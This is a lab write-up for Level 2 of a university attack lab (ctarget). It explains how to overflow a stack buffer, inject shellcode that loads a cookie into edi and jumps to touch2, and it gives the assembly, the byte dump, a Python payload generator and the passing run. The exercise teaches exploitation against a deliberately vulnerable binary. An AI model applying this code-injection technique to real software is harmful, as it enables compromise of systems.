### Level 2

This level appears similar to level 1, but there is a difference: controlling
`rip` is still required, but we additionally need to control the argument with
which `touch2` (located at `0x4017ec`)  is called such that it matches our
cookie. Since functions are called with the value of `edi` as the first
argument, we know we also need to control that value.

In order to do this, we can leverage the fact that we have control over two
things:

  1. The contents of a buffer
  2. A method by which to jump somewhere (`rip`)

Therefore instead of jumping directly to `touch2`, we can instead jump to the
beginning of our buffer. Why is this useful? Because we can place arbitrary
shellcode there and it will be executed as if it were part of the program. In
this case, we will do the following:

  1. Move the value of our cookie (which is a constant `0x59b997fa`) into `edi`
  2. Store the address of `touch2` somewhere
  3. Jump to that address

First, we can write the Assembly that we will use to generate our shellcode:

```asm
;exploit.asm
[SECTION .text]
global _start
_start:
        mov edi,0x59b997fa
        mov eax,0x4017ec
        jmp eax
```

Then we compile and inspect the byte code:

```
$ nasm -f elf explot.asm
$ objdump -d exploit.o


z.o:     file format elf32-i386


Disassembly of section .text:

00000000 <_start>:
   0:	bf fa 97 b9 59       	mov    edi,0x59b997fa
   5:	b8 ec 17 40 00       	mov    eax,0x4017ec
   a:	ff e0                	jmp    eax
```

With that bytecode, we can then write our full exploit. This is some Python
code that can generate our payload:

```python
SHELLCODE = (
    #mov edi,0x59b997fa
    '\xbf\xfa\x97\xb9\x59'
    #mov eax,0x4017ec
    '\xb8\xec\x17\x40\x00'
    #jmp eax
    '\xff\xe0'
)

BUF_ADDR = '\x78\xDC\x61\x55'

PAYLOAD = SHELLCODE + '\x90' * (40-len(SHELLCODE)) + BUF_ADDR

with open('payload', 'wb') as f:
    f.write(PAYLOAD)
```

Now that we have the full payload, take it for a spin:

```
$ ./ctarget -q -i payload
Cookie: 0x59b997fa
Touch2!: You called touch2(0x59b997fa)
Valid solution for level 2 with target ctarget
PASS: Would have posted the following:
	user id	bovik
	course	15213-f15
	lab	attacklab
	result	1:PASS:0xffffffff:ctarget:2:BF FA 97 B9 59 B8 EC 17 40 00 FF E0 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 78 DC 61 55
```
